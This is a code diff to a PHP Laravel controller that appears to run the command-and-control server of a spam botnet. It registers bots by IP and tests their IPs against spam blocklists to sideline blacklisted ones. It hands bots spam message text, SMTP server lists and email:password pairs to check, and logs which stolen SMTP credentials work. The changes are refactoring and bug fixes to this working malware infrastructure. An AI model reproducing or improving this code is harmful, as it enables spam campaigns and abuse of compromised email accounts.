@@ -13,14 +13,15 @@ use App\smtpfindpiece;
 use App\smtplistpiece;
 use Carbon\Carbon;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Storage;
 
 class CommandController extends Controller
 {
     public function index(Request $request)
     {
-        $ip          = $this->getRealIP();
-        $bot         = Bots::where(['ip' => $ip])->first();
+        $ip = $this->getRealIP();
+        $bot = Bots::where(['ip' => $ip])->first();
         $statusAdmin = PannelSettings::whereId(1)->first();
 
         if (isset($bot)) {
@@ -32,29 +33,29 @@ class CommandController extends Controller
             abort(404);
         }
 
-        if ($statusAdmin->checkBlackList == 'needCheckBlack') {
-            if ( ! isset($bot->blacklistdate)) {
+        if ($statusAdmin->checkBlackList != 'noNeedCheckBlack') {
+            if (!isset($bot->blacklistdate)) {
                 if ($this->IpBlackListTest($ip) > 0) {
-                    $bot->black         = 1;
+                    $bot->black = 1;
                     $bot->blacklistdate = Carbon::now('Europe/Kiev');
                     $bot->save();
                     echo '0';
                     exit();
                 } else {
-                    $bot->black         = 0;
+                    $bot->black = 0;
                     $bot->blacklistdate = Carbon::now('Europe/Kiev');
                     $bot->save();
                 }
             } else {
                 if (Carbon::parse($bot->blacklistdate, 'Europe/Kiev')->diffInHours(Carbon::now('Europe/Kiev')) > 0) {
                     if ($this->IpBlackListTest($ip) > 0) {
-                        $bot->black         = 1;
+                        $bot->black = 1;
                         $bot->blacklistdate = Carbon::now('Europe/Kiev');
                         $bot->save();
                         echo '0';
                         exit();
                     } else {
-                        $bot->black         = 0;
+                        $bot->black = 0;
                         $bot->blacklistdate = Carbon::now('Europe/Kiev');
                         $bot->save();
                     }
@@ -122,9 +123,9 @@ class CommandController extends Controller
             echo $settings->message_text . "\n";
 
             $bot->bot_status = 1;
-            $bot->otk        = 0;
-            $bot->life       = 1;
-            $bot->time       = Carbon::now('Europe/Kiev');
+            $bot->otk = 0;
+            $bot->life = 1;
+            $bot->time = Carbon::now('Europe/Kiev');
             $bot->save();
         }
 
@@ -132,24 +133,29 @@ class CommandController extends Controller
 
             $settingsSMTP = SettingsForCheckSMTP::find(1);
 
-            $smtpListBotCount = smtplistpiece::where('botid', '<>', '')->select('bot_id')->distinct()->count();
+            $smtpListBotCount = smtplistpiece::where('botid', '<>', '')->select(DB::raw('count(distinct botid) as count'))->first();
 
             $settings = MailSettings::find(1);
 
-            if (\intval($smtpListBotCount) < \intval($settingsSMTP->countbots)) {
+            if (\intval($smtpListBotCount->count) <= $settingsSMTP->countbots) {
 
                 if (smtplistpiece::where(['botid' => $bot->id])->first() == null) {
 
+                    $smtp = smtplistpiece::where(['isget' => 0])->orderByRaw('RAND()')->take($settingsSMTP->countsmtp)->get();
+
+
+                    if (count($smtp) < 1) {
+                        echo 0;
+                        exit();
+                    }
                     echo "8\n";
 
                     echo $settingsSMTP->threads . "\n";
 
-                    $smtp = smtplistpiece::where(['isget' => 0])->orderByRaw('RAND()')->take($settingsSMTP->countsmtp)->get();
-
                     foreach ($smtp as $item) {
                         echo $item->smtp . "\t";
                         $item->isget = 1;
-                        $item->time  = Carbon::now('Europe/Kiev');
+                        $item->time = Carbon::now('Europe/Kiev');
                         $item->botid = $bot->id;
                         $item->save();
                     }
@@ -189,7 +195,7 @@ class CommandController extends Controller
                     echo 0;
                     exit();
                 }
-            } else { //count bots
+            } else {
                 echo 0;
                 exit();
             }
@@ -198,14 +204,14 @@ class CommandController extends Controller
         if ($statusAdmin->status == 'SMTPFIND') {
 
             $settingsSMTP = FindSmtpSettings::find(1);
-            $list         = smtpfindpiece::where(['isget' => 0])->orderByRaw('RAND()')->take($settingsSMTP->count_emails)->get();
+            $list = smtpfindpiece::where(['isget' => 0])->orderByRaw('RAND()')->take($settingsSMTP->count_emails)->get();
             if (count($list) > 0) {
                 echo "2\n";
                 echo $settingsSMTP->threads . "\n";
                 foreach ($list as $item) {
                     $item->isget = 1;
                     echo $item->emailpas . "\t";
-                    $item->time  = Carbon::now('Europe/Kiev');
+                    $item->time = Carbon::now('Europe/Kiev');
                     $item->botid = $bot->id;
                     $item->save();
                 }
@@ -218,11 +224,11 @@ class CommandController extends Controller
 
     function getRealIP()
     {
-        if ( ! empty($_SERVER['HTTP_X_REAL_IP'])) {
+        if (!empty($_SERVER['HTTP_X_REAL_IP'])) {
             $ip = $_SERVER['HTTP_X_REAL_IP'];
-        } elseif ( ! empty($_SERVER['HTTP_CLIENT_IP'])) {
+        } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
             $ip = $_SERVER['HTTP_CLIENT_IP'];
-        } elseif ( ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
             $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
         } else {
             $ip = $_SERVER['REMOTE_ADDR'];
@@ -234,14 +240,14 @@ class CommandController extends Controller
     function IpBlackListTest($ip)
     {
         $countBans = 0;
-        $baracuda  = "b.barracudacentral.org";
-        $spamHaus  = "zen.spamhaus.org";
-        $abuseAt   = "cbl.abuseat.org";
+        $baracuda = "b.barracudacentral.org";
+        $spamHaus = "zen.spamhaus.org";
+        $abuseAt = "cbl.abuseat.org";
         $spamHaus2 = "xbl.spamhaus.org";
 
-        $urlb  = implode(".", array_reverse(explode(".", $ip))) . "." . $baracuda;
-        $urls  = implode(".", array_reverse(explode(".", $ip))) . "." . $spamHaus;
-        $urla  = implode(".", array_reverse(explode(".", $ip))) . "." . $abuseAt;
+        $urlb = implode(".", array_reverse(explode(".", $ip))) . "." . $baracuda;
+        $urls = implode(".", array_reverse(explode(".", $ip))) . "." . $spamHaus;
+        $urla = implode(".", array_reverse(explode(".", $ip))) . "." . $abuseAt;
         $urls2 = implode(".", array_reverse(explode(".", $ip))) . "." . $spamHaus2;
 
         $record = dns_get_record($urlb);
@@ -258,41 +264,49 @@ class CommandController extends Controller
 
     public function sendcheckers(Request $request)
     {
-        $set    = SettingsForCheckSMTP::find(1);
+        $set = SettingsForCheckSMTP::find(1);
         $result = trim($request->get('result'));
 
+$nosmtp=$sent=$saved = $bad = 0;
         if (isset($result) && strlen($result) > 3) {
 
             $resultArray = explode("\n", $result);
-
+$all = count($resultArray);
             foreach ($resultArray as $value) {
-
                 $value = trim($value);
                 if (empty($value)) {
                     continue;
                 }
-                $smtp   = explode("!-!", $value)[0];
+
+                $smtp = explode("!-!", $value)[0];
                 $status = trim(explode("!-!", $value)[1]);
 
-                $logFile    = "";
+                $logFile = "";
                 $status_err = "";
 
                 if (strtoupper($status) == 'SENT') {
+                    $sent++;
                     $logFile = "smtp_check_logs/" . $set['mark'] . "_good.txt";
                 } else {
-                    $logFile    = "smtp_check_logs/" . $set['mark'] . "_bad.txt";
+                    $bad++;
+                    $logFile = "smtp_check_logs/" . $set['mark'] . "_bad.txt";
                     $status_err = trim(explode(':', $status, 2)[1]);
-                    $status     = trim(explode(':', $status, 2)[0]);
+                    $status = trim(explode(':', $status, 2)[0]);
                 }
                 Storage::append($logFile, $value . "\r\n");
 
-                $smtp         = smtplistpiece::where(['smtp' => trim($smtp)])->first();
-                $smtp->botid  = 0;
-                $smtp->isget  = 1;
-                $smtp->time   = '';
-                $smtp->status = strtoupper($status);
-                $smtp->errmsg = $status_err;
-                $smtp->save();
+                $smtp = smtplistpiece::where(['smtp' => trim($smtp)])->first();
+                if($smtp != null) {
+                    $saved++;
+                    $smtp->botid = 0;
+                    $smtp->isget = 1;
+                    $smtp->time = '';
+                    $smtp->status = strtoupper($status);
+                    $smtp->errmsg = $status_err;
+                    $smtp->save();
+                }else{
+                    $nosmtp++;
+                }
             }
         }
     }
@@ -300,25 +314,26 @@ class CommandController extends Controller
     public function smtpcheckres(Request $request)
     {
         $result = $request->get('result');
+
         $res = explode("\r\n", urldecode($result));
+
         foreach ($res as $item) {
             $r = explode('|', $item);
             if (count($r) > 3) {
-                $logFile    = "smtp_find_logs/test_good.txt";
                 $mailpass = $r[2] . ":" . $r[3];
             } else {
-                $logFile    = "smtp_find_logs/test_bad.txt";
                 $t = explode("://", $item);
+                if (count($t) < 2) {
+                    continue;
+                }
                 $mailpass = $t[1];
             }
-
-            Storage::append($logFile, $item . "\r\n");
 
             $e = smtpfindpiece::where(['emailpas' => trim($mailpass)])->first();
             if ($e != null) {
                 $e->status = urldecode($item);
-                $e->isget  = 1;
-                $e->time   = '';
+                $e->isget = 1;
+                $e->time = '';
                 $e->save();
             }
         }
@@ -326,8 +341,8 @@ class CommandController extends Controller
 
     public function postIndex(Request $request)
     {
-        $ip     = $this->getRealIP();
-        $bot    = Bots::where(['ip' => $ip])->first();
+        $ip = $this->getRealIP();
+        $bot = Bots::where(['ip' => $ip])->first();
         $status = $request->get('status');
         if (isset($bot)) {
             if ($bot->ban == 1) {
@@ -335,9 +350,9 @@ class CommandController extends Controller
                 exit;
             }
             $bot->bot_status = $status;
-            $bot->life       = 1;
-            $bot->otk        = 0;
-            $bot->time  = Carbon::now('Europe/Kiev');
+            $bot->life = 1;
+            $bot->otk = 0;
+            $bot->time = Carbon::now('Europe/Kiev');
             $bot->save();
         } else {
             Bots::create([
